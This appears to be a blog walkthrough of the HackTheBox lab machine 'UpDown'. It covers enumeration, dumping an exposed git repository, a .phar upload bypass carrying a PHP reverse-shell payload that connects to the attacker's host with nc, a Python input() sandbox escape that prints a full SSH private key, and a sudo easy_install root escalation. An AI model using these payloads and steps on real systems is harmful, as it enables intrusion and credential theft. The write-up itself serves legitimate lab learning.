---
layout: post
title: HackTheBox - UpDown
date: 2022-09-26 15:31 +0200
author: Arcee
tags: htb box medium linux
categories: [HackTheBox, Box]
---
![UpDown](/assets/img/posts/htb-updown/updown.png)

Medium Linux Box

## Box Info:

Name: Linux

Release date: 03-09-2022

OS: Linux

Solve date: 26-9-2022

## Enumeration

Nmap results:

```bash
$ nmap -sC -sV -p- 10.10.11.177    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 13:22 CEST
Nmap scan report for 10.10.11.177
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds
```

We only have http and ssh, so we check the webpage:

![UpDown](/assets/img/posts/htb-updown/webpage.png)

We find a domain name here: siteisup.htb, so we add this to /etc/hosts 

Next we try to find all the paths using dirsearch

```bash
$ dirsearch -u http://siteisup.htb
Target: http://siteisup.htb/

[13:25:29] Starting: 
[13:25:31] 403 -  277B  - /.ht_wsr.txt                                     
[13:25:31] 403 -  277B  - /.htaccess.bak1
[13:25:31] 403 -  277B  - /.htaccess.orig
[13:25:31] 403 -  277B  - /.htaccess.save
[13:25:31] 403 -  277B  - /.htaccess.sample
[13:25:31] 403 -  277B  - /.htaccess_extra
[13:25:31] 403 -  277B  - /.htaccess_orig
[13:25:31] 403 -  277B  - /.htaccess_sc
[13:25:31] 403 -  277B  - /.htaccessOLD2
[13:25:31] 403 -  277B  - /.htaccessBAK
[13:25:31] 403 -  277B  - /.htaccessOLD
[13:25:31] 403 -  277B  - /.htm                                            
[13:25:31] 403 -  277B  - /.html
[13:25:31] 403 -  277B  - /.htpasswd_test
[13:25:31] 403 -  277B  - /.htpasswds
[13:25:31] 403 -  277B  - /.httr-oauth
[13:25:32] 403 -  277B  - /.php                                            
[13:25:45] 301 -  310B  - /dev  ->  http://siteisup.htb/dev/                
[13:25:45] 200 -    0B  - /dev/                                             
[13:25:48] 200 -    1KB - /index.php                                        
[13:25:48] 200 -    1KB - /index.php/login/                                 
[13:25:57] 403 -  277B  - /server-status                                    
[13:25:57] 403 -  277B  - /server-status/
```

We find siteisup.htb/dev. Which we also add to /etc/hosts, however the url gives a 403. 

When we look at the form on the website that can be used to check if a site is up. Enabling debug mode also shows the page source. 

- Searching for 127.0.0.1 gives “Hacking attempt was detected”
- Searching for [http://siteisup.htb](http://siteisup.htb) gives “up”
- Searching for [http://dev.siteisup.htb](http://dev.siteisup.htb) gives “seems to be down”

Enumerating the form’s post feature doesn’t give anything.

We try a path search under /dev. Which shows that there is a git repo there!

```bash
$ dirsearch -u http://siteisup.htb/dev/
Target: http://siteisup.htb/dev/

[13:33:35] Starting: 
[13:33:36] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/     
[13:33:36] 200 -    3KB - /dev/.git/                                       
[13:33:36] 200 -   21B  - /dev/.git/HEAD                                   
[13:33:36] 200 -   73B  - /dev/.git/description
[13:33:36] 200 -  772B  - /dev/.git/branches/
[13:33:36] 200 -  298B  - /dev/.git/config
[13:33:36] 200 -    4KB - /dev/.git/hooks/                                 
[13:33:36] 200 -    1KB - /dev/.git/logs/                                  
[13:33:36] 200 -  240B  - /dev/.git/info/exclude
[13:33:36] 200 -  959B  - /dev/.git/info/
[13:33:36] 301 -  325B  - /dev/.git/logs/refs  ->  http://siteisup.htb/dev/.git/logs/refs/
[13:33:36] 301 -  331B  - /dev/.git/logs/refs/heads  ->  http://siteisup.htb/dev/.git/logs/refs/heads/
[13:33:36] 301 -  333B  - /dev/.git/logs/refs/remotes  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/
[13:33:36] 301 -  335B  - /dev/.git/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/refs/remotes/origin/
[13:33:36] 301 -  326B  - /dev/.git/refs/heads  ->  http://siteisup.htb/dev/.git/refs/heads/
[13:33:36] 200 -  112B  - /dev/.git/packed-refs
[13:33:36] 200 -    1KB - /dev/.git/objects/
[13:33:36] 200 -  179B  - /dev/.git/logs/refs/remotes/origin/HEAD
[13:33:36] 301 -  328B  - /dev/.git/refs/remotes  ->  http://siteisup.htb/dev/.git/refs/remotes/
[13:33:36] 200 -    1KB - /dev/.git/refs/
[13:33:36] 301 -  340B  - /dev/.git/logs/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/origin/
[13:33:36] 301 -  325B  - /dev/.git/refs/tags  ->  http://siteisup.htb/dev/.git/refs/tags/
[13:33:36] 200 -  179B  - /dev/.git/logs/HEAD                              
[13:33:36] 200 -   30B  - /dev/.git/refs/remotes/origin/HEAD               
[13:33:36] 200 -  521B  - /dev/.git/index                                  
[13:33:36] 403 -  277B  - /dev/.ht_wsr.txt                                 
[13:33:36] 403 -  277B  - /dev/.htaccess.bak1                              
[13:33:36] 403 -  277B  - /dev/.htaccess.orig
[13:33:36] 403 -  277B  - /dev/.htaccess_orig
[13:33:36] 403 -  277B  - /dev/.htaccessOLD
[13:33:36] 403 -  277B  - /dev/.htaccess.save
[13:33:36] 403 -  277B  - /dev/.htaccess.sample
[13:33:36] 403 -  277B  - /dev/.htaccess_extra
[13:33:36] 403 -  277B  - /dev/.htaccessOLD2
[13:33:36] 403 -  277B  - /dev/.htm                                        
[13:33:36] 403 -  277B  - /dev/.htpasswds
[13:33:36] 403 -  277B  - /dev/.htaccessBAK
[13:33:36] 403 -  277B  - /dev/.html
[13:33:36] 403 -  277B  - /dev/.htpasswd_test
[13:33:36] 403 -  277B  - /dev/.htaccess_sc                                
[13:33:36] 403 -  277B  - /dev/.httr-oauth                                 
[13:33:37] 403 -  277B  - /dev/.php                                        
[13:33:53] 200 -    0B  - /dev/index.php                                    
[13:33:53] 200 -    0B  - /dev/index.php/login/                             
                                                                             
Task Completed
```

We use git-dumper to dump everything: 

```bash
$ git-dumper http://siteisup.htb/dev/ dev
```

Which downloads the entire repo onto our own system, we can now use git tools to look around. 

We use git logs 

```bash
$ git logs
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.
```

These two commits seem interesting. So we take a look at the  difference between them 

```bash
$ git diff 8812785e31c879261050e72e20f298ae8c43b565 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
diff --git a/.htaccess b/.htaccess
index b317ab5..44ff240 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,4 +2,3 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
-
```

So a special header ‘only4dev’ is required to access something. Which could possibly be the dev.siteisup.htb. 

We add Special-Dev: only4dev as a header to try to access dev.siteisup.htb:

```bash
$ curl http://dev.siteisup.htb -H "Special-Dev: only4dev"
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
                            <label>List of websites to check:</label><br><br>
                                <input type="file" name="file" size="50">
                                <input name="check" type="submit" value="Check">
                </form>

      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

We can add this header as a rule in Burp Suite (”Projection Option → Session handling rules”, change the tools scope to include the proxy and all urls)

![UpDown](/assets/img/posts/htb-updown/uploadform.png)

There is an upload form, which we can find in the sourcecode in checker.php

```bash
# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
```

It does not check for the .phar extension, so we can use that. Afterwards it creates a folder with the md5 of time as the folder name, which we can enumerate. 

Next, it reads the contents of the file:

```bash
# Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
```

And it checks the sites one by one and delete the file after checking

```bash
foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
```

**Plan of attack:**

Create a .phar file with a huge number of sites to give us enough time to browse to our uploaded file. And we include some php code in the end of the file for remote code execution. Then, we upload the file. Finally, while the checker.php is busy checking the sites, we browse to the uploaded file to execute the code. 

```bash
https://behavior.example.com/
.......
http://bed.example.com/beef
<?php
$descriptorspec = array(
0 => array("pipe", "r"), // stdin is a pipe that the child will read from
1 => array("pipe", "w"), // stdout is a pipe that the child will write to
2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("sh", $descriptorspec, $pipes);
if (is_resource($process)) {
// $pipes now looks like this:
// 0 => writeable handle connected to child stdin
// 1 => readable handle connected to child stdout
// Any error output will be appended to /tmp/error-output.txt
fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f");
fclose($pipes[0]);
while (!feof($pipes[1])) {
echo fgets($pipes[1], 1024);
}
fclose($pipes[1]);
// It is important that you close any pipes before calling
// proc_close in order to avoid a deadlock
$return_value = proc_close($process);

echo "command returned $return_value\n";
}
?>
```

We run a nc listener on which we receive the shell:

```bash
nc -lnvp 443                                                
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.177] 48184
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
developer
$ cd developer
$ ls
dev
user.txt
```

However, we are user www-data, and not developer. So we can’t access the user flag. 

We can find a python script in the dev folder: 

```bash
$ cd /home/developer/dev
$ cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"$
```

The input function is vulnerable to python sandbox escape by invoking __import__!

Inspecting the siteup executable, there is a reference to the above python script, so this binary must be calling apython script. This means that we can just call this binary and exploit python to escape the sandbox to achieve code execution in developer’s rights: 

```bash
$ ./siteisup
__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We can now save this private rsa key and log in as developer.

```bash
developer@updown:~$ ls -la
total 40
drwxr-xr-x 6 developer developer 4096 Aug 30 11:24 .
drwxr-xr-x 3 root      root      4096 Jun 22 15:47 ..
lrwxrwxrwx 1 root      root         9 Jul 27 14:21 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  231 Jun 22 15:45 .bash_logout
-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
drwx------ 2 developer developer 4096 Aug 30 11:24 .cache
drwxrwxr-x 3 developer developer 4096 Aug  1 18:19 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Aug  2 09:15 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22 15:45 dev
-rw-r----- 1 root      developer   33 Jun 22 15:45 user.txt
developer@updown:~$ cat user.txt
73****************************fc
```

## Privilege Escalation: to Root

Developer has sudo rights for: 

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

We check GTFObins for easy install: [https://gtfobins.github.io/gtfobins/easy_install/#sudo](https://gtfobins.github.io/gtfobins/easy_install/#sudo) where we use the final sudo code:

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.NT4PxVL77n
Writing /tmp/tmp.NT4PxVL77n/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.NT4PxVL77n/egg-dist-tmp-pco3ug
# id    
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
eb****************************9f
```
